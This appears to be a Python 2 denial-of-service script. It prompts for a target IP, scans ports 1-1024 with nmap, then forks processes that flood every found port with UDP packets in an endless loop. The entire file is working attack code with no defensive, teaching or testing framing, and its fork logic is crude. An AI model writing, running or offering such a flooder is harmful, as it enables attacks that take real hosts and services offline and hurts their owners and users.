import socket
import random
import os
import nmap


def attack(ip, lport):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Creates an IP UDP socket
    bytes = "000000000000000000000000"

    while 1:
        for port in lport:
            sock.sendto(bytes, (ip, port))


def main():
    nm = nmap.PortScanner()

    ip = raw_input("Enter the target to attack: ")
    nm.scan(ip, '1-1024')

    for proto in nm[ip].all_protocols():
        pass

    lport = nm[ip][proto].keys()
    lport.sort()

    foo = 0
    while foo < 4:
        pid = os.fork()
        if pid == 0:
            attack(ip, lport)
        else:
            attack(ip, lport)
        foo = foo + 1

main()